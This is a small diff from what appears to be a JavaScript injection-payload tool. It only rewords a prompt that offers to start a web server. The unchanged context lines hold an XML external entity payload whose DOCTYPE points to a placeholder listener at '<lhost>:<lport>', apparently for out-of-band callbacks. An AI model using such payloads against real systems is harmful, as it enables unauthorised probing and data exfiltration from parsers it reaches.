@@ -27,7 +27,7 @@ arrayInjection.push({
 	sample: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo PUBLIC 'bar' 'http://<lhost>:<lport>'>",
 	category: "XML",
 	callback: function(returnToPrepare){
-		prompt.message = "Bro, should I fire up a web server for you? (Y/n)"
+		prompt.message = "Should I fire up a web server for you? (Y/n)"
 
 		prompt.get([{name: '_', description: ':'}], function(err, result){
 			result._ = result._.toUpperCase()
